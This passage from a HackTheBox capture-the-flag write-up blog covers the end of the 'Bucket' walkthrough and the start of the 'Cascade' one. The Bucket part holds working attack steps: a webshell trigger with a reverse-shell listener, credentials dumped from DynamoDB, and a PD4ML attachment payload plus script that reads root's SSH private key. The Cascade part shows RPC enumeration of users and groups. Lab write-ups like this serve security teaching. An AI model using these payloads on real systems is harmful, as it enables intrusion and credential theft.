--endpoint-url=http://s3.bucket.htb Then I\u0026rsquo;ll trigger it using curl.\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://bucket.htb/iamf.php I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn\u0026rsquo;t).\n→ root@iamf «bucket» «10.10.14.39» $ rlwrap nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.39] from (UNKNOWN) [10.10.10.212] 58352 Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 18:14:02 up 13:18, 0 users, load average: 0.03, 0.04, 0.04 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1050): Inappropriate ioctl for device bash: no job control in this shell www-data@bucket:/$ Privilege Escalation Shell as roy Enumeration There is a bucket-app, but I don\u0026rsquo;t have access to it.\nwww-data@bucket:/var/www$ ls -la total 16 drwxr-xr-x 4 root root 4096 Feb 10 12:29 . drwxr-xr-x 14 root root 4096 Feb 10 12:29 .. drwxr-x---+ 4 root root 4096 Feb 10 12:29 bucket-app drwxr-xr-x 2 root root 4096 Apr 22 18:27 html roy is the only user in this box.\nwww-data@bucket:/$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash roy:x:1000:1000:,,,:/home/roy:/bin/bash Visiting roy home directory discovers a folder called project\nwww-data@bucket:/var/www$ ls -la /home/roy total 44 drwxr-xr-x 7 roy roy 4096 Apr 22 12:03 . drwxr-xr-x 3 root root 4096 Sep 16 2020 .. drwxrwxr-x 2 roy roy 4096 Apr 22 12:03 .aws lrwxrwxrwx 1 roy roy 9 Sep 16 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 roy roy 220 Sep 16 2020 .bash_logout -rw-r--r-- 1 roy roy 3771 Sep 16 2020 .bashrc drwx------ 2 roy roy 4096 Apr 22 07:57 .cache drwx------ 4 roy roy 4096 Apr 22 08:01 .gnupg -rw-r--r-- 1 roy roy 807 Sep 16 2020 .profile drwxr-xr-x 3 roy roy 4096 Apr 22 07:59 project drwxr-xr-x 3 roy roy 4096 Apr 22 07:59 snap -r-------- 1 roy roy 33 Apr 22 04:56 user.txt The files inside project are readable by others.\nwww-data@bucket:/home/roy/project$ ls -la total 44 drwxr-xr-x 3 roy roy 4096 Sep 24 2020 . drwxr-xr-x 5 roy roy 4096 Apr 24 17:31 .. -rw-rw-r-- 1 roy roy 63 Sep 24 2020 composer.json -rw-rw-r-- 1 roy roy 20533 Sep 24 2020 composer.lock -rw-r--r-- 1 roy roy 367 Sep 24 2020 db.php drwxrwxr-x 10 roy roy 4096 Sep 24 2020 vendor Looking into db.php, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.\nwww-data@bucket:/home/roy/project$ cat db.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); use Aws\\DynamoDb\\DynamoDbClient; use Aws\\DynamoDb\\Exception\\DynamoDbException; $client = new Aws\\Sdk([ \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); $dynamodb = $client-\u0026gt;createDynamoDb(); //todo localhost:4566 is the internal endpoint of s3.bucket.htb\nwww-data@bucket:/home/roy/project$ curl -s http://localhost:4566 { \u0026#34;s3\u0026#34;: \u0026#34;running\u0026#34;, \u0026#34;dynamodb\u0026#34;: \u0026#34;running\u0026#34; } AWS DynamoDB DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.\nGeneral usage:\nusage: aws [options] dynamodb \u0026lt;subcommand\u0026gt; [\u0026lt;subcommand\u0026gt; ...] [parameters] Anonymous user is allowed to list the database tables.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb { \u0026#34;TableNames\u0026#34;: [ \u0026#34;users\u0026#34; ] } I can read the content of table users with the subcommand scan, and it discovers several credentials.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb { \u0026#34;Items\u0026#34;: [ { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Management@#1@#\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Mgmt\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Welcome123!\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Cloudadm\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;n2vM-\u0026lt;_K_Q:.Aa2\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Sysadm\u0026#34; } } ], \u0026#34;Count\u0026#34;: 3, \u0026#34;ScannedCount\u0026#34;: 3, \u0026#34;ConsumedCapacity\u0026#34;: null } I\u0026rsquo;ll keep those credentials.\nSSH Access Password n2vM-\u0026lt;_K_Q:.Aa2 works on roy.\n→ root@iamf «bucket» «10.10.14.39» $ crackmapexec ssh \u0026#39;10.10.10.212\u0026#39; -u roy -p passwords.list SSH 10.10.10.212 22 10.10.10.212 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4 SSH 10.10.10.212 22 10.10.10.212 [-] roy:Management@#1@# Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [-] roy:Welcome123! Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [+] roy:n2vM-\u0026lt;_K_Q:.Aa2 Now I can login into the system using roy credentials.\n→ root@iamf «bucket» «10.10.14.39» $ ssh roy@10.10.10.212 roy@10.10.10.212\u0026#39;s password: Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) ...\u0026lt;SNIP\u0026gt;... System load: 0.02 Usage of /: 33.8% of 17.59GB Memory usage: 29% Swap usage: 0% Processes: 252 Users logged in: 0 IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:df48 ...\u0026lt;SNIP\u0026gt;... roy@bucket:~$ id uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm) roy@bucket:~$ The user flag is done here.\nShell as root Enumeration Running WinPEAS discovers another service currently running on port 8000.\n[+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4566 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:46275 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - It also discovers that bucket-app in /var/www/ is belong to the root user and readable to user roy but not to others.\n[+] Readable files belonging to root and readable by me but not world readable -rwxr-x---+ 1 root root 808729 Jun 10 2020 /var/www/bucket-app/pd4ml_demo.jar -rw-r-x---+ 1 root root 358 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/README.md -rw-r-x---+ 1 root root 1085 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE -rw-r-x---+ 1 root root 4689 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php -rw-r-x---+ 1 root root 4746 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php I can list the contents inside bucket-app\nroy@bucket:/var/www/bucket-app$ ls -la total 856 drwxr-x---+ 4 root root 4096 Feb 10 12:29 . drwxr-xr-x 4 root root 4096 Feb 10 12:29 .. -rw-r-x---+ 1 root root 63 Sep 23 2020 composer.json -rw-r-x---+ 1 root root 20533 Sep 23 2020 composer.lock drwxr-x---+ 2 root root 4096 Apr 22 12:38 files -rwxr-x---+ 1 root root 17222 Sep 23 2020 index.php -rwxr-x---+ 1 root root 808729 Jun 10 2020 pd4ml_demo.jar drwxr-x---+ 10 root root 4096 Feb 10 12:29 vendor According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.\nroy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf \u0026lt;VirtualHost 127.0.0.1:8000\u0026gt; # unknown \u0026lt;IfModule mpm_itk_module\u0026gt; AssignUserId root root \u0026lt;/IfModule\u0026gt; DocumentRoot /var/www/bucket-app \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; # bucket.htb DocumentRoot /var/www/html RewriteEngine On RewriteCond %{HTTP_HOST} !^bucket.htb$ RewriteRule /.* http://bucket.htb/ [R] \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; # s3.bucket.htb ProxyPreserveHost on ProxyPass / http://localhost:4566/ ProxyPassReverse / http://localhost:4566/ \u0026lt;Proxy *\u0026gt; Order deny,allow Allow from all \u0026lt;/Proxy\u0026gt; ServerAdmin webmaster@localhost ServerName s3.bucket.htb ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; Internal Web I\u0026rsquo;ll expose the internal web to my localhost on the same port using SSH local port forwarding.\nroy@bucket:/var/www/bucket-app$ ~C ssh\u0026gt; -L 8000:127.0.0.1:8000 Forwarding port. roy@bucket:/var/www/bucket-app$ The website page says the site is under construction.\nSource Code Review Upon reviewing the index.php, I found out that this website can be abused.\nroy@bucket:/var/www/bucket-app$ cat index.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;]===\u0026#34;POST\u0026#34;) { if($_POST[\u0026#34;action\u0026#34;]===\u0026#34;get_alerts\u0026#34;) { # POST action=get_alerts  date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); $client = new DynamoDbClient([ # Connect to DynamoDB. \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); $iterator = $client-\u0026gt;getIterator(\u0026#39;Scan\u0026#39;, array( # Read content from table alerts \u0026#39;TableName\u0026#39; =\u0026gt; \u0026#39;alerts\u0026#39;, \u0026#39;FilterExpression\u0026#39; =\u0026gt; \u0026#34;title = :title\u0026#34;, # Filter by title \u0026#39;ExpressionAttributeValues\u0026#39; =\u0026gt; array(\u0026#34;:title\u0026#34;=\u0026gt;array(\u0026#34;S\u0026#34;=\u0026gt;\u0026#34;Ransomware\u0026#34;)), )); foreach ($iterator as $item) { #  $name=rand(1,10000).\u0026#39;.html\u0026#39;; # Generate randomnumber.html  file_put_contents(\u0026#39;files/\u0026#39;.$name,$item[\u0026#34;data\u0026#34;]); # Write contents to randomnumber.html } passthru(\u0026#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name800 A4 -out files/result.pdf\u0026#34;); # convert randomnumber.html to result.pdf } } else { ?\u0026gt; ...\u0026lt;SNIP\u0026gt;... Let\u0026rsquo;s break it down.\nWhen there is a POST request contains data of action=get_alerts, the site will create a connection to DynamoDB.\nif($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;]===\u0026#34;POST\u0026#34;) { if($_POST[\u0026#34;action\u0026#34;]===\u0026#34;get_alerts\u0026#34;) { # POST action=get_alerts  date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); $client = new DynamoDbClient([ # Connect to DynamoDB.  \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); It then reads every item in table alerts and filters out the result only to the one that contains string value of “Ransomware” (the key).\n DynamoDB is key-value NoSQL database.\n $iterator = $client-\u0026gt;getIterator(\u0026#39;Scan\u0026#39;, array( # Read content from table alerts  \u0026#39;TableName\u0026#39; =\u0026gt; \u0026#39;alerts\u0026#39;, \u0026#39;FilterExpression\u0026#39; =\u0026gt; \u0026#34;title = :title\u0026#34;, # Filter by title  \u0026#39;ExpressionAttributeValues\u0026#39; =\u0026gt; array(\u0026#34;:title\u0026#34;=\u0026gt;array(\u0026#34;S\u0026#34;=\u0026gt;\u0026#34;Ransomware\u0026#34;)), )); For each result, it writes the result value ($item[“data”]) of \u0026ldquo;Ransomware\u0026rdquo; to a randomly named HTML file.\nforeach ($iterator as $item) { #  $name=rand(1,10000).\u0026#39;.html\u0026#39;; # Generate randomnumber.html  file_put_contents(\u0026#39;files/\u0026#39;.$name,$item[\u0026#34;data\u0026#34;]); # Write contents to randomnumber.html } The HTML file then gets converted into a PDF file (result.pdf) using pd4ml.\npassthru(\u0026#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name800 A4 -out files/result.pdf\u0026#34;); # convert randomnumber.html to result.pdf From the enumeration above on the DynamoDB, I know there is no table called alerts.\nThe idea is, if I have a control over the alerts table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)\n *The web application is currently running as root\n Obtain root SSH Key First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.\ntest-table.json:\n{ \u0026#34;TableName\u0026#34;: \u0026#34;iamf\u0026#34;, \u0026#34;AttributeDefinitions\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;AttributeType\u0026#34; : \u0026#34;S\u0026#34; } ], \u0026#34;KeySchema\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;KeyType\u0026#34; : \u0026#34;HASH\u0026#34; } ], \u0026#34;ProvisionedThroughput\u0026#34; : { \u0026#34;WriteCapacityUnits\u0026#34;: 5, \u0026#34;ReadCapacityUnits\u0026#34;: 10 } } Now I can use the subcommand create-table with --cli-input-json option and specify the JSON file.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url http://s3.bucket.htb { \u0026#34;TableDescription\u0026#34;: { \u0026#34;AttributeDefinitions\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; } ], \u0026#34;TableName\u0026#34;: \u0026#34;iamf\u0026#34;, \u0026#34;KeySchema\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;HASH\u0026#34; } ], \u0026#34;TableStatus\u0026#34;: \u0026#34;ACTIVE\u0026#34;, \u0026#34;CreationDateTime\u0026#34;: \u0026#34;2021-04-22T15:22:33.634000-04:00\u0026#34;, ...\u0026lt;SNIP\u0026gt;... I can confirm the table has been created using the subcommand list-tables.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb { \u0026#34;TableNames\u0026#34;: [ \u0026#34;iamf\u0026#34;, \u0026#34;users\u0026#34; ] }  I can also insert items to the table, but I\u0026rsquo;ll skip it here. Detailed notes are available on my GitHub.\n Knowing this, now I can create the alerts table. I’ll write it on JSON format as well.\nalert-table.json:\n{ \u0026#34;TableName\u0026#34;: \u0026#34;alerts\u0026#34;, \u0026#34;AttributeDefinitions\u0026#34;: [ {\u0026#34;AttributeName\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;AttributeType\u0026#34; : \u0026#34;S\u0026#34;}, {\u0026#34;AttributeName\u0026#34;: \u0026#34;data\u0026#34;, \u0026#34;AttributeType\u0026#34; : \u0026#34;S\u0026#34;} ], \u0026#34;KeySchema\u0026#34;: [ {\u0026#34;AttributeName\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;KeyType\u0026#34; : \u0026#34;HASH\u0026#34;}, {\u0026#34;AttributeName\u0026#34;: \u0026#34;data\u0026#34;, \u0026#34;KeyType\u0026#34; : \u0026#34;RANGE\u0026#34;} ], \u0026#34;ProvisionedThroughput\u0026#34; : {\u0026#34;WriteCapacityUnits\u0026#34;: 5, \u0026#34;ReadCapacityUnits\u0026#34;: 10} } Now to abuse the application for file read, I’ll put the root SSH key path within \u0026lt;pd4ml:attachment\u0026gt; tags. The tags can be used to embed a file [source]. I\u0026rsquo;ll write it on JSON format and name it as payload.json\npayload.json\n{ \u0026#34;title\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Ransomware\u0026#34; }, \u0026#34;data\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;\u0026lt;pd4ml:attachment\u0026gt;file:///root/.ssh/id_rsa\u0026lt;/pd4ml:attachment\u0026gt;\u0026#34; } } And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as getroot.sh.\ngetroot.sh\n#!/bin/bash  echo \u0026#34;[+] Create table\u0026#34; aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url=http://s3.bucket.htb \u0026gt;/dev/null sleep 0.5 echo \u0026#34;[+] Insert item\u0026#34; aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url=http://s3.bucket.htb \u0026gt;/dev/null sleep 0.5 echo \u0026#34;[+] Send get alerts\u0026#34; curl -svd \u0026#34;action=get_alerts\u0026#34; http://127.0.0.1:8000/ # The port 8000 on Bucket forwarded to localhost:8000  The script assume all the required files are stored in the same folder.\n I’ll watch the result.pdf at /var/www/bucket/files and grab the SSH key using roy’s session.\nroy@bucket:/var/www/bucket-app/files$ while sleep 2; do sed -n \u0026#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p\u0026#39; * 2\u0026gt;/dev/null; done Now I can just execute the getroot.sh script and wait for it to complete.\n→ root@iamf «bucket» «10.10.14.39» $ ./getroot.sh [+] Create table [+] Insert item [+] Send get alerts * Trying 127.0.0.1:8000... * TCP_NODELAY set * Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0) \u0026gt; POST / HTTP/1.1 \u0026gt; Host: 127.0.0.1:8000 \u0026gt; User-Agent: curl/7.66.0 \u0026gt; Accept: */* \u0026gt; Content-Length: 17 \u0026gt; Content-Type: application/x-www-form-urlencoded \u0026gt; * upload completely sent off: 17 out of 17 bytes * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Date: Thu, 22 Apr 2021 20:04:14 GMT \u0026lt; Server: Apache/2.4.41 (Ubuntu) \u0026lt; Content-Length: 0 \u0026lt; Content-Type: text/html; charset=UTF-8 \u0026lt; * Connection #0 to host 127.0.0.1 left intact On roy shell, I can see it captured the ssh key.\nroy@bucket:/var/www/bucket-app/files$ while sleep 1; do sed -n \u0026#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p\u0026#39; * 2\u0026gt;/dev/null; done -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn ...\u0026lt;SNIP\u0026gt;... -----END OPENSSH PRIVATE KEY----- The full process as shown below:\nI’ll save that key as root_rsa and change its permission to 600.\n→ root@iamf «bucket» «10.10.14.39» $ chmod 600 root_rsa After that, I can just login as root user using the SSH key I obtained.\n→ root@iamf «bucket» «10.10.14.39» $ ssh -i root_rsa 10.10.10.212 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) ...\u0026lt;SNIP\u0026gt;... IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:df48 ...\u0026lt;SNIP\u0026gt;... root@bucket:~# id;hostname;cut -c-15 root.txt uid=0(root) gid=0(root) groups=0(root) bucket efc73dd09ceb705  References  https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3 https://pd4ml.com/html.htm  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-bucket/","summary":"Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user.","tags":["OSCP-like","Linux","AWS","LocalStack","S3","DynamoDB","Webshell","Code-review","Tunneling","PD4ML","Gobuster"],"title":"HackTheBox - Bucket"},{"content":"Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by VbScrub, the creator of Nest. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application. The database file used by the application contains an encrypted credentials of another user which can be decrypted by reversing the application. The last credentials I obtained allow me to recover the administrator password from AD Recycle Bin.\nSkills Learned  RPC enumeration Decrypting VNC password Reversing .NET  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux smbclient - Preinstalled in Kali Linux rpcclient - Preinstalled in Kali Linux smbget - Preinstalled in Kali Linux evil-winrm - https://github.com/Hackplayers/evil-winrm dnSpy - https://github.com/dnSpy/dnSpy/ Impacket - https://github.com/SecureAuthCorp/impacket  Reconnaissance Nmap nmap shows the typical port used by Active Directory domain controller.\n→ root@iamf «nmap» «192.168.43.234» $ mkdir nmap; nmap -sC -sV -oA nmap/initial-cascade 10.10.10.182 PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-03 00:20:10Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 1s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-06-03T00:21:02 |_ start_date: 2020-06-02T04:24:21 nmap discovers the domain name of Cascade and also identifies the OS version.\nI\u0026rsquo;ll take notes on these:\n Domain: cascade.local Host: Windows Server 2008 R2 SP1  The full scan almost returns the same result, except it discovers a WinRM port (5985).\n→ root@iamf «nmap» «192.168.43.234» $ nmap -p- -oA nmap/full-cascade cascade.htb PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown  I\u0026rsquo;ve added 10.10.10.182 cascade.htb to my /etc/hosts\n Enumeration TCP 445 - SMB / RPC over SMB Anonymous login is allowed on SMB port. I tried to list all the shares using smbclient but there was nothing there.\n→ root@iamf «nmap» «192.168.43.234» $ smbclient -N -L //10.10.10.182 Anonymous login successful Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available Enumeration via RPC Knowing anonymous login is allowed on SMB, I can try it too on RPC using rpcclient and it works as well.\nWith current access, I can obtain the domain users and their groups manually.\nUser enumeration\n→ root@iamf «nmap» «192.168.43.234» $ rpcclient -U \u0026#39;%\u0026#39; 10.10.10.182 rpcclient $\u0026gt; rpcclient $\u0026gt; enumdomusers user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f] I\u0026rsquo;ll save the output to a file called users, and filter the usernames only then pipe it to users.list\n→ root@iamf «cascade» «192.168.43.234» $ cat users | tr -d \u0026#39;[]\u0026#39; | cut -d \u0026#39; \u0026#39; -f1 | cut -c6- | tee users.list CascGuest arksvc s.smith r.thompson util j.wakefield s.hickson j.goodhand a.turnbull e.crowe b.hanson d.burman BackupSvc j.allen i.croft Builtin group enumeration\nrpcclient $\u0026gt; enumalsgroups builtin group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] Domain group enumeration\nrpcclient $\u0026gt; enumalsgroups domain group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44e] group:[IT] rid:[0x459] group:[Production] rid:[0x45a] group:[HR] rid:[0x45b] group:[AD Recycle Bin] rid:[0x45f] group:[Backup] rid:[0x460] group:[Temps] rid:[0x463] group:[WinRMRemoteWMIUsers__] rid:[0x465] group:[Remote Management Users] rid:[0x466] group:[Factory] rid:[0x46c] group:[Finance] rid:[0x46d] group:[Audit Share] rid:[0x471] group:[Data Share] rid:[0x472] List group members:\nMembers of IT group (rid:0x459)\nrpcclient $\u0026gt; queryaliasmem domain 0x459 sid:[S-1–5–21–3332504370–1206983947–1165150453–1106] sid:[S-1–5–21–3332504370–1206983947–1165150453–1107] sid:[S-1–5–21–3332504370–1206983947–1165150453–1109] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106 S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE\\arksvc (1) rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107 S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE\\s.smith (1) rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1109 S-1–5–21–3332504370–1206983947–1165150453–1109 CASCADE\\r.thompson (1) Members of Remote Management Users group (rid:0x466)\nrpcclient $\u0026gt; queryaliasmem domain 0x466 sid:[S-1–5–21–3332504370–1206983947–1165150453–1106] sid:[S-1–5–21–3332504370–1206983947–1165150453–1107] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106 S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE\\arksvc (1) rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107 S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE\\s.smith (1) Member of AD Recycle Bin\nrpcclient $\u0026gt; queryaliasmem domain 0x45f sid:[S-1–5–21–3332504370–1206983947–1165150453–1106] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106 S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE\\arksvc (1) Members of HR (rid:0x45b)\nrpcclient $\u0026gt; queryaliasmem domain 0x45b sid:[S-1–5–21–3332504370–1206983947–1165150453–1121] Members of Audit group (rid:0x471)\nrpcclient $\u0026gt; queryaliasmem domain 0x471 sid:[S-1–5–21–3332504370–1206983947–1165150453–1107] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107 S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE\\s.smith (1) Members of Data share group (rid:0x472)\nrpcclient $\u0026gt; queryaliasmem domain 0x472 sid:[S-1–5–21–3332504370–1206983947–1165150453–513] rpcclient $\u0026gt; lookupsids 